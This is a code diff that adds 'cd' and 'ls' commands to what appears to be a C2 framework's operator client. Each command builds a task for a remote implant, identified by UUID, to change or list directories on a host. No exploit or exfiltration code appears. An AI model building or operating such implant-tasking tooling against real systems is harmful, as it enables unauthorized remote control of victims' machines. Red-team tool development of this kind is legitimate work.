@@ -127,6 +127,22 @@ async def task_tree(command, args, implant_uuid):
             except ParseError as e:
                 return (ResultType.ERROR, str(e))
 
+        case "cd":
+            try:
+                task = Cd(implant_uuid=implant_uuid, directory=args).to_task()
+                return (ResultType.TASK, task)
+            # if not all args are present, or there's a bug, this will bubble up and be put on screen
+            except ParseError as e:
+                return (ResultType.ERROR, str(e))
+
+        case "ls":
+            try:
+                task = Ls(implant_uuid=implant_uuid, directory=args).to_task()
+                return (ResultType.TASK, task)
+            # if not all args are present, or there's a bug, this will bubble up and be put on screen
+            except ParseError as e:
+                return (ResultType.ERROR, str(e))
+
         case "data_command":
             data = "somedata"
             return (ResultType.TEXT, data)  # Use Enum for clarity
@@ -185,6 +201,65 @@ class Cmd:
 
         task_args = {"cli": self.cli}
         task_detail = TaskDetail(task_name="cmd", args=task_args)
+
+        final_task = create_and_verify_task(
+            implant_uuid=self.implant_uuid, task=task_detail
+        )
+        return final_task
+
+
+@dataclass
+class Cd:
+    R"""
+    Change the current working directory on the host. Ex: `cd C:\\Users\\`
+    """
+
+    implant_uuid: str
+    directory: str
+
+    def __post_init__(self):
+        """Automatically run something when the dataclass is created."""
+        if not self.directory:
+            # Raise a ParseError exception if cli is None or empty
+            raise ParseError(
+                "The 'dir' argument cannot be None or empty. Ex: `cd <cli arg>`: `cd C:\\Users\\`"
+            )
+
+    def to_task(self) -> dict:
+        """Convert the dataclass to a task style dictionary structure."""
+
+        task_args = {"directory": self.directory}
+        task_detail = TaskDetail(task_name="cd", args=task_args)
+
+        final_task = create_and_verify_task(
+            implant_uuid=self.implant_uuid, task=task_detail
+        )
+        return final_task
+
+
+@dataclass
+class Ls:
+    R"""
+    List the contents of a directory on the host. Ex: `ls C:\\Users\\`
+    """
+
+    implant_uuid: str
+    directory: str
+
+    def __post_init__(self):
+        """Automatically run something when the dataclass is created."""
+        if not self.directory:
+            # raise ParseError(
+            #     "The 'dir' argument cannot be None or empty. Ex: `ls <dir arg>`: `ls C:\\Users\\`"
+            # )
+            # instead of throwing a parse error, just list "." if no directory is provided, which is more intuitive for ls
+            self.directory = "."
+
+    def to_task(self) -> dict:
+        """Convert the dataclass to a task style dictionary structure."""
+
+        task_args = {"directory": self.directory}
+        task_detail = TaskDetail(task_name="ls", args=task_args)
 
         final_task = create_and_verify_task(
             implant_uuid=self.implant_uuid, task=task_detail
